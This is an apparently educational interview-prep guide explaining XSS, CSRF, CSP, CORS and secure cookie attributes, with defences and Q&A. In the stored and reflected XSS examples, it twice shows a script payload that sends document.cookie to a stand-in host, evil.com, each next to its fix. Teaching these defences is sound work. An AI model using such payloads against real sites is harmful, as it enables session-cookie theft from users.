XSS — Cross-Site Scripting

Plain English
XSS is when an attacker gets THEIR JavaScript to run inside YOUR web page, in YOUR users' browsers — as if your own site had written that code. Once their script runs, it can steal cookies/tokens, submit forms, redirect the user, or do anything your legitimate JavaScript could do.
The three types of XSS
// ✗ Stored XSS example — a comment field saved and rendered UNESCAPED userComment = '<script>fetch("evil.com/steal?cookie="+document.cookie)</script>'; page.innerHTML = userComment; // the script tag EXECUTES for every visitor // ✓ Fix — escape/encode user content, or use a safe text-insertion method element.textContent = userComment; // treated as PLAIN TEXT, never executes
Prevention techniqueHow it helps
Output encoding/escapingConverts special characters (<, >, &, etc.) to their HTML entity equivalents, so injected markup is displayed as TEXT, not executed
Use textContent instead of innerHTMLtextContent never interprets its input as HTML at all — the safest default when inserting user-supplied text
A well-configured CSP (Section 3)Even if malicious script somehow gets injected, CSP can block it from executing or from exfiltrating data
Sanitization libraries (e.g. DOMPurify)For cases where you genuinely need to allow SOME HTML (rich text), sanitize it against a strict allowlist first
HttpOnly cookies (Section 5)Doesn't prevent XSS itself, but limits the DAMAGE — a successful XSS attack can't read an HttpOnly cookie via JavaScript

CSRF — Cross-Site Request Forgery

Plain English
CSRF tricks a user's BROWSER into making a request to a site they're already logged into — using their EXISTING session/cookies — without the user intending or even knowing about it. The attacker never sees or steals the cookie; they just get the browser to USE it on their behalf.
How a CSRF attack works
Prevention techniqueHow it helps
CSRF tokensA unique, unpredictable token embedded in each form/request that the server verifies — an attacker's forged request can't know/include the correct token
SameSite cookie attributeTells the browser NOT to send the cookie on cross-site requests at all (Section 5) — often the single most effective modern defense
Checking the Origin/Referer headerThe server can verify the request actually originated from its own site, rejecting requests claiming to come from elsewhere
Requiring re-authentication for sensitive actionsFor high-stakes actions (changing a password, transferring money), requiring the user to re-enter their password limits what a forged request alone can accomplish

CSP — Content Security Policy

Plain English
CSP is a response header where a site tells the BROWSER "only run scripts/load resources from THESE specific sources — block anything else, even if it somehow ends up in the page." It's a safety net specifically designed to blunt the impact of XSS, even if an injection vulnerability exists elsewhere.
// Example CSP header Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; object-src 'none';
DirectiveControls
default-srcThe FALLBACK policy for any directive not explicitly specified
script-srcWhich sources JavaScript can be loaded/executed from — the MOST security-critical directive for XSS mitigation
style-srcWhich sources CSS can be loaded from
img-srcWhich sources images can be loaded from
connect-srcWhich origins fetch/XHR/WebSocket requests can be made to — relevant for blocking XSS DATA EXFILTRATION
object-srcControls <object>/<embed>/<applet> — often set to 'none' since these are rarely needed and historically risky
frame-ancestorsWhich sites are allowed to embed THIS page in an <iframe> — the modern replacement for X-Frame-Options, preventing clickjacking
🚨 'unsafe-inline' and 'unsafe-eval' significantly weaken CSP's XSS protection — they allow inline `<script>` tags and `eval()`-style code execution, which are exactly the mechanisms many XSS payloads rely on. A strong CSP avoids these, using external script files and nonces/hashes instead.

CORS — Cross-Origin Resource Sharing

Plain English
By default, the browser's Same-Origin Policy blocks JavaScript on one site from READING responses from a DIFFERENT origin's API. CORS is the mechanism that lets a server explicitly say "actually, it's fine for THIS other origin to read my responses" — via response headers the browser checks before handing data back to the requesting page's JavaScript.
Simple request vs. preflighted request
HeaderPurpose
Access-Control-Allow-OriginWhich origin(s) are allowed to read this response — a specific origin, or `*` for any origin (with caveats around credentials)
Access-Control-Allow-MethodsWhich HTTP methods are allowed for cross-origin requests (GET, POST, PUT, etc.)
Access-Control-Allow-HeadersWhich custom request headers the client is allowed to send
Access-Control-Allow-CredentialsWhether cookies/credentials can be included in the cross-origin request — CANNOT be combined with a wildcard `*` origin
⚠ CORS is enforced by the BROWSER, not the server. The server always SENDS the response regardless — CORS headers just determine whether the BROWSER lets the requesting page's JavaScript actually read that response. This is why CORS doesn't protect server-to-server requests (like from a backend or curl) at all — only browser-based, cross-origin JS requests are subject to it.

Secure Cookie Attributes

Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
HttpOnly
Plain English: "JavaScript can't touch this cookie at all." The cookie is only sent in HTTP requests/responses — `document.cookie` in JavaScript simply won't see it. This directly limits the damage a successful XSS attack can do, since injected JS can't steal an HttpOnly session cookie.
Secure
Plain English: "Only send this cookie over HTTPS, never plain HTTP." Prevents the cookie from being exposed if a request accidentally goes out over an unencrypted connection, where it could be intercepted in transit.
SameSite
Plain English: "Only send this cookie when the request originates from THIS site" — the primary modern defense against CSRF. Three values: Strict (never sent cross-site, even from a link), Lax (sent for top-level navigation like clicking a link, but not for background cross-site requests like images/iframes — the browser DEFAULT today), None (sent on all cross-site requests, requires `Secure` to be set alongside it).

✓ The key interview insight: none of these mechanisms is a complete solution on its own — real security comes from DEFENSE IN DEPTH, layering multiple protections so that a single failure doesn't lead directly to a full compromise.

Common Gotchas & Interview Traps

  • ⚠️CORS is often confused with a general "security feature" that protects the SERVER — but it's enforced entirely by the BROWSER, protecting the requesting page's JavaScript from being tricked into exposing data it read from another origin; it does nothing to stop non-browser requests (curl, server-to-server, Postman) from reading an API's response at all.
  • ⚠️CSRF and XSS are often conflated but are fundamentally different attacks — XSS is about INJECTING malicious script into your page; CSRF is about ABUSING an existing authenticated session via a request from a DIFFERENT site, without needing to inject any script into your page at all.
  • ⚠️Access-Control-Allow-Origin: * cannot be combined with credentialed requests — if a request includes cookies/credentials, the server MUST specify an exact origin (not a wildcard), and must also send `Access-Control-Allow-Credentials: true`; this is a deliberate spec restriction to prevent a dangerously overpermissive combination.
  • ⚠️SameSite=Lax is the modern BROWSER DEFAULT when no SameSite attribute is set at all — this is a relatively recent, significant change (browsers used to default to sending cookies on all cross-site requests); worth mentioning as an example of the platform itself evolving to be more secure by default.
  • ⚠️HttpOnly doesn't protect against CSRF at all — it protects against JavaScript READING the cookie (relevant to XSS), but the browser still AUTOMATICALLY attaches an HttpOnly cookie to outgoing requests, which is exactly the behavior CSRF exploits; these are solving different problems and aren't substitutes for each other.
  • ⚠️A Content-Security-Policy with 'unsafe-inline' in script-src provides dramatically weaker XSS protection than one without it — many real-world sites end up with a weakened CSP because removing 'unsafe-inline' requires refactoring inline scripts/handlers, which can be substantial migration work; worth mentioning as a common REAL-WORLD trade-off, not just a theoretical best practice.
  • ⚠️DOM-based XSS can occur ENTIRELY client-side, without the malicious payload ever touching the server at all — e.g. JavaScript reading `location.hash` and unsafely inserting it into the DOM; server-side output encoding alone doesn't protect against this specific variant, since the server never even sees the malicious part of the URL.
  • ⚠️The Same-Origin Policy (which CORS provides a controlled EXCEPTION to) considers protocol, domain, AND port all part of "origin" — `http://example.com` and `https://example.com` are DIFFERENT origins, as are `example.com:3000` and `example.com:8080`, a common point of confusion.
  • ⚠️CSP's frame-ancestors directive is the modern replacement for the older X-Frame-Options header — both address clickjacking (preventing a malicious site from embedding your page in an invisible iframe to trick users into clicking something), but frame-ancestors offers more flexible, granular control and is the currently-recommended approach.
  • ⚠️None of these mechanisms is a substitute for basic input validation and parameterized queries against OTHER attack classes (like SQL injection) — XSS/CSRF/CORS/CSP/cookies are all specifically about the BROWSER/client-side security model; server-side data validation and injection prevention is a separate, equally important concern outside this specific topic's scope.

Interview Q&A — Why / What / When / How

🎯 Web security fundamentals are near-universal interview topics — the strongest answers clearly distinguish these five concepts from EACH OTHER (they're often confused/conflated) rather than treating them as one blended "security stuff" category.
WhatWhat's the fundamental difference between XSS and CSRF?
+
XSS is about INJECTING malicious JavaScript into a vulnerable page, so it executes with the SAME privileges as the site's own legitimate code — the attacker's code runs, in the victim's browser, ON the vulnerable site. CSRF doesn't inject anything into the target site at all — instead, it tricks the victim's BROWSER (from a completely different, malicious site) into making a request TO the target site, relying on the fact that the browser automatically attaches the victim's existing session cookies to that request regardless of which page triggered it. XSS is fundamentally a CODE INJECTION problem; CSRF is fundamentally a problem of the browser's automatic, origin-unaware cookie-attaching behavior being exploited.
WhyWhy is CORS enforced by the browser rather than the server, and what does this mean for its actual security guarantees?
+
CORS exists specifically to relax the browser's OWN Same-Origin Policy in a controlled way — the underlying problem it addresses (a malicious page's JavaScript reading data from another origin the victim is logged into) is fundamentally about what a BROWSER allows client-side script to do, so the enforcement naturally belongs in the browser itself. This means CORS provides ZERO protection against any request that ISN'T coming from browser-executed JavaScript — a server-to-server request, a command-line tool like curl, or a mobile app calling the same API is completely unaffected by CORS headers, since there's no browser enforcing them in that context. This is a common misconception: CORS is NOT a general API access-control mechanism; it's specifically about protecting browser-based cross-origin JavaScript reads, and genuine API access control still needs to happen via proper authentication/authorization on the server.
WhenWhen would SameSite=Strict be a worse choice than SameSite=Lax, despite being the more restrictive/secure-sounding option?
+
When users legitimately need to arrive at your site FROM an external link while already logged in and expect to remain authenticated — for example, clicking a link in an email that takes them to a specific logged-in page on your site. With `Strict`, the session cookie would NOT be sent on that initial cross-site navigation at all, meaning the user would appear logged OUT even though they have a valid session, creating a confusing experience (they'd need to navigate again, or the site would need extra logic to handle this). `Lax` still sends the cookie for this kind of top-level, user-initiated cross-site navigation (like clicking a link), while still blocking it for background/automatic cross-site requests (which is where CSRF attacks typically operate) — making `Lax` a better balance of security and usability for most typical session cookies, which is exactly why it's the modern browser default.
HowHow would you explain, in plain English, what a CSP header actually does to someone unfamiliar with web security?
+
Imagine your website normally trusts its OWN code completely — any script that ends up on the page just runs, no questions asked. A Content Security Policy is like giving the browser a specific GUEST LIST for your page: "only run scripts that come from MY OWN server, or from this ONE trusted CDN I've specifically approved — block anything else, even if it somehow gets onto the page." So if an attacker manages to sneak a malicious `<script>` tag into your page (through some XSS vulnerability), the BROWSER itself refuses to actually run that script, because it's not from an approved source on the guest list — even though the vulnerability that let the attacker inject the tag in the first place still technically exists. It's a safety net that limits the DAMAGE of an injection attack, even when it can't prevent the injection itself.
WhatWhat does the HttpOnly cookie attribute actually protect against, and what does it NOT protect against?
+
HttpOnly prevents JavaScript (via `document.cookie`) from being able to READ the cookie's value at all — the cookie is still sent normally in actual HTTP requests/responses, it's just invisible to client-side script. This specifically protects against an attacker's XSS payload trying to STEAL the cookie's value (e.g. to send it to an attacker-controlled server for later reuse) — if the cookie is HttpOnly, injected JavaScript simply can't access it to exfiltrate it. However, HttpOnly does NOT prevent the cookie from being AUTOMATICALLY SENT by the browser on legitimate-looking requests — including forged ones from a CSRF attack, since the browser attaches cookies based on the target DOMAIN, not based on where the request originated from; HttpOnly and CSRF protection (like SameSite) address different parts of the problem.
WhyWhy can't Access-Control-Allow-Origin: * be used together with Access-Control-Allow-Credentials: true?
+
`Access-Control-Allow-Origin: *` tells the browser "ANY origin in the world may read this response." Combining that with `Access-Control-Allow-Credentials: true` (which permits the request to include the user's cookies/session) would mean literally ANY website on the internet could make an authenticated, credentialed request to your API AND read the personalized, potentially sensitive response — a catastrophic security hole, since it would defeat the entire purpose of having authentication/session cookies in the first place. The CORS specification deliberately FORBIDS this exact combination as a safeguard — if credentials are involved, the server MUST specify an EXACT, explicit origin (never a wildcard), ensuring only a genuinely trusted, specifically-named origin can make credentialed cross-origin requests.
WhenWhen would relying on SameSite cookies alone NOT be sufficient CSRF protection, requiring CSRF tokens as well?
+
When you need to support OLDER browsers that don't recognize or enforce the SameSite attribute at all — in that case, the browser simply ignores the attribute and falls back to older, less secure default cookie-sending behavior, leaving the application effectively unprotected against CSRF for those users if SameSite were the ONLY defense in place. Additionally, some legitimate use cases genuinely require `SameSite=None` (fully cross-site cookie sending, e.g. for certain third-party embedded/widget scenarios), which explicitly DISABLES SameSite's CSRF protection for that cookie — in such cases, CSRF tokens remain necessary as the primary defense. Using BOTH mechanisms together provides defense in depth, covering gaps that either one alone might leave open depending on browser support or specific configuration needs.
HowHow would you explain to a teammate why their reflected XSS vulnerability (from an unescaped URL query parameter shown on the page) is a real, exploitable security risk, not just a cosmetic display bug?
+
// The vulnerable code const query = new URLSearchParams(location.search).get("search"); resultsHeader.innerHTML = `Results for: ${query}`; // UNESCAPED // An attacker crafts and shares this URL: // yoursite.com/search?search=<script>fetch('evil.com/steal?c='+document.cookie)</script>
The vulnerability isn't just that the query parameter DISPLAYS oddly — it's that ANY text placed in that URL parameter, INCLUDING actual executable `<script>` tags, gets inserted directly into the page via `innerHTML`, which means the BROWSER will actually EXECUTE it as real JavaScript, running with the SAME permissions as the site's own legitimate code. An attacker can craft a malicious URL like the one above, then trick a victim into clicking it (via a phishing email, a malicious ad, a shortened link) — when the victim (while already logged into your site) clicks it, the injected script runs in THEIR browser, on YOUR site's origin, and can silently steal their session cookie (if not HttpOnly), perform actions on their behalf, or redirect them to a fake login page to steal credentials. The fix — escaping the value or using `textContent` instead of `innerHTML` — ensures the query parameter's content is always treated as inert TEXT to display, never as code to execute, regardless of what an attacker puts in it.
